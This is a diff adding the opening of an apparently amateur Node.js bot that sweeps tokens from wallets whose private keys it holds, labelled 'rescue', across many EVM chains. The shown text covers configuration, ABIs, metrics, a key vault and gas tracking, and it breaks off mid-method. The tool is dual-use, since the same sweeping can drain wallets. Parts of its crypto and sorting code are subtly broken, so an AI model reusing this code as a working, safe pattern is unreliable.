@@ -1,0 +1,1017 @@
+I DONT KNOW WHAT I WAS DOING LOL JUST TRYING SHIT FOR NO REASON
+
+
+
+
+require('dotenv').config();
+const { ethers } = require('ethers');
+const { FlashbotsBundleProvider } = require('@flashbots/ethers-provider-bundle');
+const { HDNode } = ethers.utils;
+const express = require('express');
+const helmet = require('helmet');
+const rateLimit = require('express-rate-limit');
+const cors = require('cors');
+const morgan = require('morgan');
+const axios = require('axios');
+const WebSocket = require('ws');
+const crypto = require('crypto');
+const fs = require('fs');
+const path = require('path');
+const cron = require('node-cron');
+const readline = require('readline');
+const winston = require('winston');
+const bip39 = require('bip39');
+const hdkey = require('hdkey');
+const jwt = require('jsonwebtoken');
+const bcrypt = require('bcryptjs');
+const { Temporal } = require('@js-temporal/polyfill');
+const promClient = require('prom-client');
+
+// ======================
+// ENHANCED CONFIGURATION WITH ALL CHAINS
+// ======================
+const CONFIG = {
+  // Core Settings
+  PORT: process.env.PORT || 3000,
+  NODE_ENV: process.env.NODE_ENV || 'development',
+
+  // Security & Encryption
+  ENCRYPTION_KEY: process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex'),
+  KEY_ENCRYPTION_PASSWORD: process.env.KEY_ENCRYPTION_PASSWORD,
+  JWT_SECRET: process.env.JWT_SECRET || crypto.randomBytes(64).toString('hex'),
+  ADMIN_PASSWORD: process.env.ADMIN_PASSWORD,
+  SAFE_ADDRESS: process.env.SAFE_ADDRESS || process.env.SAFE_WALLET,
+  RELAY_KEY: process.env.RELAY_KEY,
+  ADMIN_ADDRESS: process.env.ADMIN_ADDRESS,
+  PRIVATE_KEY: process.env.PRIVATE_KEY,
+
+  // Wallet Management
+  HD_WALLET_MNEMONIC: process.env.HD_WALLET_MNEMONIC,
+  COMPROMISED_KEYS: process.env.COMPROMISED_KEYS?.split(',')?.map(k => k.trim()) || [],
+  MONITORED_WALLETS: (process.env.MONITORED_WALLETS || '').split(',').map(w => w.trim().toLowerCase()).filter(Boolean),
+  EMERGENCY_WALLET: process.env.EMERGENCY_WALLET,
+
+  // Transaction Settings
+  CHAIN_ID: parseInt(process.env.CHAIN_ID) || 1,
+  CONTRACT_ADDRESS: process.env.CONTRACT_ADDRESS,
+  SWEEP_INTERVAL: parseInt(process.env.SWEEP_INTERVAL) || 10000,
+  MIN_ETH_BALANCE: ethers.utils.parseEther(process.env.MIN_ETH_BALANCE || "0.001"),
+  MIN_SWEEP_ETH: ethers.utils.parseEther(process.env.MIN_SWEEP_ETH || "0.01"),
+  GAS_BUFFER: ethers.utils.parseEther(process.env.GAS_BUFFER || "0.001"),
+  GAS_MULTIPLIER: parseFloat(process.env.GAS_MULTIPLIER) || 3.0,
+  PRIORITY_FEE: ethers.utils.parseUnits(process.env.PRIORITY_FEE || "15", "gwei"),
+  MAX_GAS_PRICE: ethers.utils.parseUnits(process.env.MAX_GAS_PRICE || "100", "gwei"),
+  MAX_RETRIES: parseInt(process.env.MAX_RETRIES) || 3,
+  RETRY_DELAY: parseInt(process.env.RETRY_DELAY) || 1000,
+  FEE_PERCENTAGE: parseInt(process.env.FEE_PERCENTAGE || '50'),
+  BATCH_SIZE: parseInt(process.env.BATCH_SIZE || '100'),
+
+  // Enhanced Network Infrastructure with QuickNode support
+  RPC_CONFIG: {
+    ethereum: process.env.ETH_RPC || process.env.QUICKNODE_ETH_RPC || 'https://mainnet.infura.io/v3/YOUR_KEY',
+    polygon: process.env.POLYGON_RPC || process.env.QUICKNODE_POLYGON_RPC || 'https://polygon-rpc.com',
+    bsc: process.env.BSC_RPC || process.env.QUICKNODE_BSC_RPC || 'https://bsc-dataseed.binance.org',
+    arbitrum: process.env.ARB_RPC || process.env.QUICKNODE_ARB_RPC || 'https://arb1.arbitrum.io/rpc',
+    optimism: process.env.OPT_RPC || process.env.QUICKNODE_OPT_RPC || 'https://mainnet.optimism.io',
+    avalanche: process.env.AVAX_RPC || process.env.QUICKNODE_AVAX_RPC || 'https://api.avax.network/ext/bc/C/rpc',
+    fantom: process.env.FTM_RPC || process.env.QUICKNODE_FTM_RPC || 'https://rpc.ftm.tools',
+    base: process.env.BASE_RPC || process.env.QUICKNODE_BASE_RPC || 'https://mainnet.base.org',
+    cronos: process.env.CRONOS_RPC || 'https://evm.cronos.org',
+    celo: process.env.CELO_RPC || 'https://forno.celo.org',
+    moonbeam: process.env.MOONBEAM_RPC || 'https://rpc.api.moonbeam.network',
+    gnosis: process.env.GNOSIS_RPC || 'https://rpc.gnosischain.com',
+    harmony: process.env.HARMONY_RPC || 'https://api.harmony.one',
+    aurora: process.env.AURORA_RPC || 'https://mainnet.aurora.dev',
+    klaytn: process.env.KLAYTN_RPC || 'https://public-node-api.klaytnapi.com/v1/cypress',
+    metis: process.env.METIS_RPC || 'https://andromeda.metis.io/?owner=1088',
+    milkomeda: process.env.MILKOMEDA_RPC || 'https://rpc-mainnet-cardano-evm.c1.milkomeda.com',
+    evmos: process.env.EVMOS_RPC || 'https://eth.bd.evmos.org:8545'
+  },
+  
+  MONITOR_RPC_URLS: [
+    "wss://eth.llamarpc.com",
+    "wss://virginia.rpc.blxrbdn.com/ws",
+    "wss://api.blocknative.com/v0/ws",
+    process.env.QUICKNODE_WSS || "wss://your-quicknode-endpoint.com"
+  ],
+
+  // API Keys & Services
+  ETHERSCAN_KEY: process.env.ETHERSCAN_KEY || process.env.ETHERSCAN_API_KEY,
+  POLYGONSCAN_KEY: process.env.POLYGONSCAN_KEY,
+  BSCSCAN_KEY: process.env.BSCSCAN_KEY,
+  ARBISCAN_KEY: process.env.ARBISCAN_KEY,
+  OPTIMISTIC_ETHERSCAN_KEY: process.env.OPTIMISTIC_ETHERSCAN_KEY,
+  SNOWTRACE_KEY: process.env.SNOWTRACE_KEY,
+  FTMSCAN_KEY: process.env.FTMSCAN_KEY,
+  BASESCAN_KEY: process.env.BASESCAN_KEY,
+  BLOCKNATIVE_KEY: process.env.BLOCKNATIVE_KEY,
+  BLOCKSEC_KEY: process.env.BLOCKSEC_KEY,
+  FLASHBOTS_RELAYER: process.env.FLASHBOTS_RELAYER,
+  COINGECKO_API: process.env.COINGECKO_API || process.env.TOKEN_PRICE_API || 'https://api.coingecko.com/api/v3',
+  QUICKNODE_API_KEY: process.env.QUICKNODE_API_KEY,
+  ALCHEMY_KEY: process.env.ALCHEMY_KEY,
+  INFURA_KEY: process.env.INFURA_KEY,
+  TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN,
+  TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID,
+  DISCORD_WEBHOOK: process.env.DISCORD_WEBHOOK,
+  SLACK_WEBHOOK: process.env.SLACK_WEBHOOK,
+
+  // Gas APIs
+  GAS_APIS: {
+    ethereum: {
+      ethGasStation: 'https://ethgasstation.info/api/ethgasAPI.json',
+      gasNow: 'https://www.gasnow.org/api/v3/gas/price',
+      blocknative: process.env.BLOCKNATIVE_GAS_API
+    }
+  },
+
+  // Enhanced Token Registry - All Major Chains
+  TOKEN_REGISTRY: {
+    ethereum: [
+      { symbol: 'ETH', address: ethers.constants.AddressZero, decimals: 18, coingeckoId: 'ethereum' },
+      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6, coingeckoId: 'usd-coin' },
+      { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6, coingeckoId: 'tether' },
+      { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, coingeckoId: 'dai' },
+      { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8, coingeckoId: 'wrapped-bitcoin' },
+      { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, coingeckoId: 'shiba-inu' },
+      { symbol: 'LINK', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18, coingeckoId: 'chainlink' },
+      { symbol: 'UNI', address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, coingeckoId: 'uniswap' },
+      { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18, coingeckoId: 'weth' },
+      { symbol: 'PEPE', address: '0x6982508145454Ce325dDbE47a25d4ec3d2311933', decimals: 18, coingeckoId: 'pepe' }
+    ],
+    polygon: [
+      { symbol: 'MATIC', address: ethers.constants.AddressZero, decimals: 18, coingeckoId: 'matic-network' },
+      { symbol: 'USDC', address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', decimals: 6, coingeckoId: 'usd-coin' },
+      { symbol: 'USDT', address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', decimals: 6, coingeckoId: 'tether' },
+      { symbol: 'DAI', address: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', decimals: 18, coingeckoId: 'dai' },
+      { symbol: 'WETH', address: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619', decimals: 18, coingeckoId: 'weth' },
+      { symbol: 'WBTC', address: '0x1bfd67037b42cf73acf2047067bd4f2c47d9bfd6', decimals: 8, coingeckoId: 'wrapped-bitcoin' }
+    ],
+    bsc: [
+      { symbol: 'BNB', address: ethers.constants.AddressZero, decimals: 18, coingeckoId: 'binancecoin' },
+      { symbol: 'BUSD', address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', decimals: 18, coingeckoId: 'binance-usd' },
+      { symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, coingeckoId: 'tether' },
+      { symbol: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18, coingeckoId: 'usd-coin' },
+      { symbol: 'CAKE', address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', decimals: 18, coingeckoId: 'pancakeswap-token' },
+      { symbol: 'WBNB', address: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', decimals: 18, coingeckoId: 'wbnb' }
+    ],
+    arbitrum: [
+      { symbol: 'ETH', address: ethers.constants.AddressZero, decimals: 18, coingeckoId: 'ethereum' },
+      { symbol: 'USDC', address: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8', decimals: 6, coingeckoId: 'usd-coin' },
+      { symbol: 'USDT', address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', decimals: 6, coingeckoId: 'tether' },
+      { symbol: 'WBTC', address: '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f', decimals: 8, coingeckoId: 'wrapped-bitcoin' },
+      { symbol: 'ARB', address: '0x912CE59144191C1204E64559FE8253a0e49E6548', decimals: 18, coingeckoId: 'arbitrum' }
+    ],
+    optimism: [
+      { symbol: 'ETH', address: ethers.constants.AddressZero, decimals: 18, coingeckoId: 'ethereum' },
+      { symbol: 'USDC', address: '0x7F5c764cBc14f9669B88837ca1490cCa17c31607', decimals: 6, coingeckoId: 'usd-coin' },
+      { symbol: 'USDT', address: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', decimals: 6, coingeckoId: 'tether' },
+      { symbol: 'OP', address: '0x4200000000000000000000000000000000000042', decimals: 18, coingeckoId: 'optimism' }
+    ],
+    avalanche: [
+      { symbol: 'AVAX', address: ethers.constants.AddressZero, decimals: 18, coingeckoId: 'avalanche-2' },
+      { symbol: 'USDC', address: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E', decimals: 6, coingeckoId: 'usd-coin' },
+      { symbol: 'USDT', address: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7', decimals: 6, coingeckoId: 'tether' },
+      { symbol: 'WAVAX', address: '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7', decimals: 18, coingeckoId: 'wrapped-avax' }
+    ],
+    fantom: [
+      { symbol: 'FTM', address: ethers.constants.AddressZero, decimals: 18, coingeckoId: 'fantom' },
+      { symbol: 'USDC', address: '0x04068DA6C83AFCFA0e13ba15A6696662335D5B75', decimals: 6, coingeckoId: 'usd-coin' },
+      { symbol: 'USDT', address: '0x049d68029688eAbF473097a2fC38ef61633A3C7A', decimals: 6, coingeckoId: 'tether' },
+      { symbol: 'WFTM', address: '0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83', decimals: 18, coingeckoId: 'wrapped-fantom' }
+    ],
+    base: [
+      { symbol: 'ETH', address: ethers.constants.AddressZero, decimals: 18, coingeckoId: 'ethereum' },
+      { symbol: 'USDC', address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', decimals: 6, coingeckoId: 'usd-coin' },
+      { symbol: 'WETH', address: '0x4200000000000000000000000000000000000006', decimals: 18, coingeckoId: 'weth' }
+    ]
+  },
+
+  // Scanner APIs for each chain
+  SCANNER_APIS: {
+    ethereum: 'https://api.etherscan.io/api',
+    polygon: 'https://api.polygonscan.com/api',
+    bsc: 'https://api.bscscan.com/api',
+    arbitrum: 'https://api.arbiscan.io/api',
+    optimism: 'https://api-optimistic.etherscan.io/api',
+    avalanche: 'https://api.snowtrace.io/api',
+    fantom: 'https://api.ftmscan.com/api',
+    base: 'https://api.basescan.org/api'
+  },
+
+  // EIP-7702 Constants
+  DELEGATION_DESIGNATOR_PREFIX: '0xef',
+  DELEGATION_DESIGNATOR_VERSION: '0x01',
+  DELEGATION_DESIGNATOR_SUBVERSION: '0x00',
+  SET_CODE_TX_TYPE: 4
+};
+
+// Enhanced Chain Information
+const CHAIN_INFO = {
+  ethereum: { id: 1, name: 'Ethereum', symbol: 'ETH', coinType: 60 },
+  polygon: { id: 137, name: 'Polygon', symbol: 'MATIC', coinType: 966 },
+  bsc: { id: 56, name: 'BSC', symbol: 'BNB', coinType: 60 },
+  arbitrum: { id: 42161, name: 'Arbitrum', symbol: 'ETH', coinType: 60 },
+  optimism: { id: 10, name: 'Optimism', symbol: 'ETH', coinType: 60 },
+  avalanche: { id: 43114, name: 'Avalanche', symbol: 'AVAX', coinType: 60 },
+  fantom: { id: 250, name: 'Fantom', symbol: 'FTM', coinType: 60 },
+  base: { id: 8453, name: 'Base', symbol: 'ETH', coinType: 60 },
+  cronos: { id: 25, name: 'Cronos', symbol: 'CRO', coinType: 60 },
+  celo: { id: 42220, name: 'Celo', symbol: 'CELO', coinType: 60 },
+  moonbeam: { id: 1284, name: 'Moonbeam', symbol: 'GLMR', coinType: 60 },
+  gnosis: { id: 100, name: 'Gnosis', symbol: 'xDAI', coinType: 60 },
+  harmony: { id: 1666600000, name: 'Harmony', symbol: 'ONE', coinType: 60 },
+  aurora: { id: 1313161554, name: 'Aurora', symbol: 'ETH', coinType: 60 },
+  klaytn: { id: 8217, name: 'Klaytn', symbol: 'KLAY', coinType: 60 },
+  metis: { id: 1088, name: 'Metis', symbol: 'METIS', coinType: 60 },
+  milkomeda: { id: 2001, name: 'Milkomeda', symbol: 'milkADA', coinType: 60 },
+  evmos: { id: 9001, name: 'Evmos', symbol: 'EVMOS', coinType: 60 }
+};
+
+// ======================
+// ENHANCED ABIS
+// ======================
+const ERC20_ABI = [
+  "function name() view returns (string)",
+  "function symbol() view returns (string)",
+  "function decimals() view returns (uint8)",
+  "function totalSupply() view returns (uint256)",
+  "function balanceOf(address) view returns (uint256)",
+  "function transfer(address to, uint256 amount) returns (bool)",
+  "function allowance(address owner, address spender) view returns (uint256)",
+  "function approve(address spender, uint256 amount) returns (bool)",
+  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
+  "event Transfer(address indexed from, address indexed to, uint256 value)",
+  "event Approval(address indexed owner, address indexed spender, uint256 value)"
+];
+
+const ERC721_ABI = [
+  "function name() view returns (string)",
+  "function symbol() view returns (string)",
+  "function balanceOf(address owner) view returns (uint256)",
+  "function ownerOf(uint256 tokenId) view returns (address)",
+  "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
+  "function tokenURI(uint256 tokenId) view returns (string)",
+  "function safeTransferFrom(address from, address to, uint256 tokenId)",
+  "function transferFrom(address from, address to, uint256 tokenId)",
+  "function approve(address to, uint256 tokenId)",
+  "function getApproved(uint256 tokenId) view returns (address)",
+  "function setApprovalForAll(address operator, bool approved)",
+  "function isApprovedForAll(address owner, address operator) view returns (bool)",
+  "event Transfer(address indexed from, address indexed to, uint256 indexed tokenId)",
+  "event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId)",
+  "event ApprovalForAll(address indexed owner, address indexed operator, bool approved)"
+];
+
+const ERC1155_ABI = [
+  "function balanceOf(address account, uint256 id) view returns (uint256)",
+  "function balanceOfBatch(address[] accounts, uint256[] ids) view returns (uint256[])",
+  "function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes data)",
+  "function safeBatchTransferFrom(address from, address to, uint256[] ids, uint256[] amounts, bytes data)",
+  "function setApprovalForAll(address operator, bool approved)",
+  "function isApprovedForAll(address account, address operator) view returns (bool)",
+  "event TransferSingle(address indexed operator, address indexed from, address indexed to, uint256 id, uint256 value)",
+  "event TransferBatch(address indexed operator, address indexed from, address indexed to, uint256[] ids, uint256[] values)",
+  "event ApprovalForAll(address indexed account, address indexed operator, bool approved)"
+];
+
+// ======================
+// PROMETHEUS METRICS
+// ======================
+const register = new promClient.Registry();
+promClient.collectDefaultMetrics({ register });
+
+const metrics = {
+  txProcessed: new promClient.Counter({
+    name: 'rescue_transactions_processed_total',
+    help: 'Total transactions processed',
+    labelNames: ['chain', 'type', 'status'],
+    registers: [register]
+  }),
+  sweepValue: new promClient.Gauge({
+    name: 'rescue_sweep_value_wei',
+    help: 'Total value swept in wei',
+    labelNames: ['chain'],
+    registers: [register]
+  }),
+  errorCount: new promClient.Counter({
+    name: 'rescue_errors_total',
+    help: 'Total errors encountered',
+    labelNames: ['type', 'chain'],
+    registers: [register]
+  }),
+  gasPrice: new promClient.Gauge({
+    name: 'rescue_gas_price_gwei',
+    help: 'Current gas price in gwei',
+    labelNames: ['chain'],
+    registers: [register]
+  }),
+  walletCount: new promClient.Gauge({
+    name: 'rescue_wallets_total',
+    help: 'Total wallets being monitored',
+    labelNames: ['type'],
+    registers: [register]
+  })
+};
+
+// ======================
+// ENHANCED LOGGER SETUP
+// ======================
+const logger = winston.createLogger({
+  level: CONFIG.NODE_ENV === 'production' ? 'info' : 'debug',
+  format: winston.format.combine(
+    winston.format.timestamp(),
+    winston.format.errors({ stack: true }),
+    winston.format.json()
+  ),
+  transports: [
+    new winston.transports.File({ 
+      filename: path.join(__dirname, 'logs', 'error.log'), 
+      level: 'error',
+      maxsize: 10 * 1024 * 1024, // 10MB
+      maxFiles: 5
+    }),
+    new winston.transports.File({ 
+      filename: path.join(__dirname, 'logs', 'combined.log'),
+      maxsize: 10 * 1024 * 1024, // 10MB
+      maxFiles: 10
+    }),
+    new winston.transports.Console({
+      format: winston.format.combine(
+        winston.format.colorize(),
+        winston.format.simple()
+      )
+    })
+  ]
+});
+
+// Create logs directory if it doesn't exist
+if (!fs.existsSync(path.join(__dirname, 'logs'))) {
+  fs.mkdirSync(path.join(__dirname, 'logs'), { recursive: true });
+}
+
+// ======================
+// ENHANCED SECURE VAULT
+// ======================
+class SecureVault {
+  static encrypt(text, key) {
+    const iv = crypto.randomBytes(16);
+    const cipher = crypto.createCipheriv('aes-256-gcm', Buffer.from(key, 'hex'), iv);
+    const encrypted = Buffer.concat([cipher.update(text), cipher.final()]);
+    return {
+      iv: iv.toString('hex'),
+      content: encrypted.toString('hex'),
+      tag: cipher.getAuthTag().toString('hex')
+    };
+  }
+
+  static decrypt(encrypted, key) {
+    const decipher = crypto.createDecipheriv(
+      'aes-256-gcm', 
+      Buffer.from(key, 'hex'), 
+      Buffer.from(encrypted.iv, 'hex')
+    );
+    decipher.setAuthTag(Buffer.from(encrypted.tag, 'hex'));
+    return Buffer.concat([
+      decipher.update(Buffer.from(encrypted.content, 'hex')),
+      decipher.final()
+    ]).toString();
+  }
+
+  static generateSalt() {
+    return crypto.randomBytes(32).toString('hex');
+  }
+
+  static hashPassword(password, salt) {
+    return crypto.pbkdf2Sync(password, salt, 100000, 64, 'sha512').toString('hex');
+  }
+
+  static verifyPassword(password, hash, salt) {
+    const hashVerify = crypto.pbkdf2Sync(password, salt, 100000, 64, 'sha512').toString('hex');
+    return hash === hashVerify;
+  }
+}
+
+// ======================
+// ENHANCED KEY VAULT
+// ======================
+class KeyVault {
+  constructor() {
+    this.keys = [];
+    this.encryptedStorage = path.join(__dirname, 'storage', 'vault.enc');
+    this.ivStorage = path.join(__dirname, 'storage', 'iv.enc');
+    this.backupStorage = path.join(__dirname, 'storage', 'backup');
+    this.ensureStorageDirectories();
+    this.loadKeys();
+  }
+
+  ensureStorageDirectories() {
+    const dirs = [
+      path.join(__dirname, 'storage'),
+      this.backupStorage
+    ];
+    dirs.forEach(dir => {
+      if (!fs.existsSync(dir)) {
+        fs.mkdirSync(dir, { recursive: true });
+      }
+    });
+  }
+
+  loadKeys() {
+    try {
+      if (fs.existsSync(this.encryptedStorage) && fs.existsSync(this.ivStorage)) {
+        const encrypted = fs.readFileSync(this.encryptedStorage, 'utf8');
+        const iv = fs.readFileSync(this.ivStorage, 'utf8');
+        
+        const decipher = crypto.createDecipheriv(
+          'aes-256-gcm',
+          Buffer.from(CONFIG.KEY_ENCRYPTION_PASSWORD),
+          Buffer.from(iv, 'hex')
+        );
+        
+        let decrypted = decipher.update(encrypted, 'hex', 'utf8');
+        decrypted += decipher.final('utf8');
+        
+        const data = JSON.parse(decrypted);
+        this.keys = data.keys || [];
+        
+        logger.info(`Loaded ${this.keys.length} encrypted keys from secure storage`);
+      } else {
+        this.keys = CONFIG.COMPROMISED_KEYS || [];
+        logger.info(`Loaded ${this.keys.length} keys from environment variables`);
+      }
+    } catch (e) {
+      logger.error('Failed to load encrypted keys, using fallback', { error: e.message });
+      this.keys = CONFIG.COMPROMISED_KEYS || [];
+    }
+  }
+
+  saveKeys() {
+    try {
+      // Create backup before saving new keys
+      this.createBackup();
+      
+      const iv = crypto.randomBytes(16);
+      const cipher = crypto.createCipheriv(
+        'aes-256-gcm',
+        Buffer.from(CONFIG.KEY_ENCRYPTION_PASSWORD),
+        iv
+      );
+      
+      const data = {
+        keys: this.keys,
+        timestamp: new Date().toISOString(),
+        checksum: this.calculateChecksum()
+      };
+      
+      let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
+      encrypted += cipher.final('hex');
+      
+      fs.writeFileSync(this.encryptedStorage, encrypted);
+      fs.writeFileSync(this.ivStorage, iv.toString('hex'));
+      
+      logger.info('Keys saved to encrypted storage');
+    } catch (e) {
+      logger.error('Failed to save keys', { error: e.message });
+      throw e;
+    }
+  }
+
+  createBackup() {
+    try {
+      if (fs.existsSync(this.encryptedStorage)) {
+        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+        const backupFile = path.join(this.backupStorage, `vault-${timestamp}.enc`);
+        fs.copyFileSync(this.encryptedStorage, backupFile);
+        
+        // Keep only last 10 backups
+        this.cleanupBackups();
+      }
+    } catch (e) {
+      logger.warn('Failed to create backup', { error: e.message });
+    }
+  }
+
+  cleanupBackups() {
+    try {
+      const files = fs.readdirSync(this.backupStorage)
+        .filter(f => f.startsWith('vault-') && f.endsWith('.enc'))
+        .map(f => ({
+          name: f,
+          path: path.join(this.backupStorage, f),
+          stat: fs.statSync(path.join(this.backupStorage, f))
+        }))
+        .sort((a, b) => b.stat.mtime - a.stat.mtime);
+
+      if (files.length > 10) {
+        files.slice(10).forEach(file => {
+          fs.unlinkSync(file.path);
+        });
+      }
+    } catch (e) {
+      logger.warn('Failed to cleanup backups', { error: e.message });
+    }
+  }
+
+  calculateChecksum() {
+    const data = JSON.stringify(this.keys.sort());
+    return crypto.createHash('sha256').update(data).digest('hex');
+  }
+
+  addKey(key, metadata = {}) {
+    if (!ethers.utils.isHexString(key, 32)) {
+      throw new Error("Invalid private key format");
+    }
+    
+    const wallet = new ethers.Wallet(key);
+    
+    // Check if key already exists
+    if (this.keys.some(k => typeof k === 'object' ? k.key === key : k === key)) {
+      throw new Error("Key already exists");
+    }
+    
+    const keyData = {
+      key,
+      address: wallet.address,
+      added: new Date().toISOString(),
+      metadata: {
+        source: metadata.source || 'manual',
+        description: metadata.description || '',
+        risk_level: metadata.risk_level || 'medium'
+      }
+    };
+    
+    this.keys.push(keyData);
+    this.saveKeys();
+    
+    logger.info('New wallet added to vault', { 
+      address: wallet.address,
+      source: metadata.source 
+    });
+  }
+
+  removeKey(address) {
+    const initialLength = this.keys.length;
+    this.keys = this.keys.filter(k => {
+      const keyAddress = typeof k === 'object' ? k.address : new ethers.Wallet(k).address;
+      return keyAddress.toLowerCase() !== address.toLowerCase();
+    });
+    
+    if (this.keys.length < initialLength) {
+      this.saveKeys();
+      logger.info('Wallet removed from vault', { address });
+      return true;
+    }
+    return false;
+  }
+
+  getWallets(provider) {
+    return this.keys.map(k => {
+      const key = typeof k === 'object' ? k.key : k;
+      return new ethers.Wallet(key, provider);
+    });
+  }
+
+  getWalletInfo() {
+    return this.keys.map(k => {
+      if (typeof k === 'object') {
+        return {
+          address: k.address,
+          added: k.added,
+          metadata: k.metadata
+        };
+      } else {
+        const wallet = new ethers.Wallet(k);
+        return {
+          address: wallet.address,
+          added: 'legacy',
+          metadata: { source: 'legacy' }
+        };
+      }
+    });
+  }
+}
+
+// ======================
+// ENHANCED GAS TRACKER WITH MULTI-SOURCE
+// ======================
+class GasTracker {
+  constructor(provider, chain = 'ethereum') {
+    this.provider = provider;
+    this.chain = chain;
+    this.currentGasPrice = ethers.BigNumber.from(0);
+    this.currentBaseFee = ethers.BigNumber.from(0);
+    this.currentPriorityFee = ethers.BigNumber.from(0);
+    this.lastUpdate = 0;
+    this.cacheTTL = 15000; // 15 seconds for production
+    this.maxGasPrice = CONFIG.MAX_GAS_PRICE;
+    this.gasHistory = [];
+    this.sources = this.initializeGasSources();
+  }
+
+  initializeGasSources() {
+    const sources = [];
+    
+    // Add provider as primary source
+    sources.push({
+      name: 'rpc',
+      fetch: () => this.provider.getFeeData()
+    });
+
+    // Add chain-specific gas APIs
+    if (this.chain === 'ethereum') {
+      if (CONFIG.ETHERSCAN_KEY) {
+        sources.push({
+          name: 'etherscan',
+          fetch: () => this.fetchEtherscanGas()
+        });
+      }
+      
+      if (CONFIG.BLOCKNATIVE_KEY) {
+        sources.push({
+          name: 'blocknative',
+          fetch: () => this.fetchBlocknativeGas()
+        });
+      }
+    }
+
+    return sources;
+  }
+
+  async fetchEtherscanGas() {
+    try {
+      const response = await axios.get(
+        `https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey=${CONFIG.ETHERSCAN_KEY}`,
+        { timeout: 5000 }
+      );
+      
+      if (response.data.status === '1') {
+        return {
+          gasPrice: ethers.utils.parseUnits(response.data.result.ProposeGasPrice, 'gwei'),
+          maxFeePerGas: ethers.utils.parseUnits(response.data.result.FastGasPrice, 'gwei'),
+          maxPriorityFeePerGas: ethers.utils.parseUnits('2', 'gwei')
+        };
+      }
+    } catch (error) {
+      logger.debug('Etherscan gas API failed', { error: error.message });
+    }
+    return null;
+  }
+
+  async fetchBlocknativeGas() {
+    try {
+      const response = await axios.get(
+        'https://api.blocknative.com/gasprices/blockprices',
+        { 
+          headers: { 'Authorization': CONFIG.BLOCKNATIVE_KEY },
+          timeout: 5000 
+        }
+      );
+      
+      if (response.data.blockPrices && response.data.blockPrices.length > 0) {
+        const latest = response.data.blockPrices[0];
+        return {
+          gasPrice: ethers.utils.parseUnits(latest.estimatedPrices[1].price.toString(), 'gwei'),
+          maxFeePerGas: ethers.utils.parseUnits(latest.estimatedPrices[2].price.toString(), 'gwei'),
+          maxPriorityFeePerGas: ethers.utils.parseUnits(latest.estimatedPrices[1].priorityFeePerGas.toString(), 'gwei')
+        };
+      }
+    } catch (error) {
+      logger.debug('Blocknative gas API failed', { error: error.message });
+    }
+    return null;
+  }
+
+  async updateGasPrices() {
+    try {
+      const gasPrices = [];
+      
+      // Fetch from all sources
+      for (const source of this.sources) {
+        try {
+          const feeData = await source.fetch();
+          if (feeData && feeData.gasPrice) {
+            gasPrices.push({
+              source: source.name,
+              gasPrice: feeData.gasPrice,
+              maxFeePerGas: feeData.maxFeePerGas || feeData.gasPrice,
+              maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.utils.parseUnits('2', 'gwei')
+            });
+          }
+        } catch (error) {
+          logger.debug(`Gas source ${source.name} failed`, { error: error.message });
+        }
+      }
+
+      if (gasPrices.length === 0) {
+        throw new Error('No gas price sources available');
+      }
+
+      // Use median gas price for stability
+      const sortedPrices = gasPrices.map(g => g.gasPrice).sort((a, b) => a.sub(b));
+      const medianIndex = Math.floor(sortedPrices.length / 2);
+      this.currentGasPrice = sortedPrices[medianIndex];
+
+      // Add safety buffer
+      this.currentGasPrice = this.currentGasPrice.mul(110).div(100);
+
+      // Update metrics
+      metrics.gasPrice.set({ chain: this.chain }, parseFloat(ethers.utils.formatUnits(this.currentGasPrice, 'gwei')));
+
+      this.lastUpdate = Date.now();
+      
+      // Store in history
+      this.gasHistory.push({
+        timestamp: Date.now(),
+        gasPrice: this.currentGasPrice,
+        sources: gasPrices.length
+      });
+
+      // Keep only last hour of history
+      this.gasHistory = this.gasHistory.filter(h => Date.now() - h.timestamp < 3600000);
+
+      logger.debug('Gas prices updated', { 
+        chain: this.chain,
+        gwei: ethers.utils.formatUnits(this.currentGasPrice, 'gwei'),
+        sources: gasPrices.length
+      });
+
+    } catch (error) {
+      logger.error('Gas update failed', { 
+        chain: this.chain,
+        error: error.message 
+      });
+      metrics.errorCount.inc({ type: 'gas_update', chain: this.chain });
+    }
+  }
+
+  getCurrentGasPrice() {
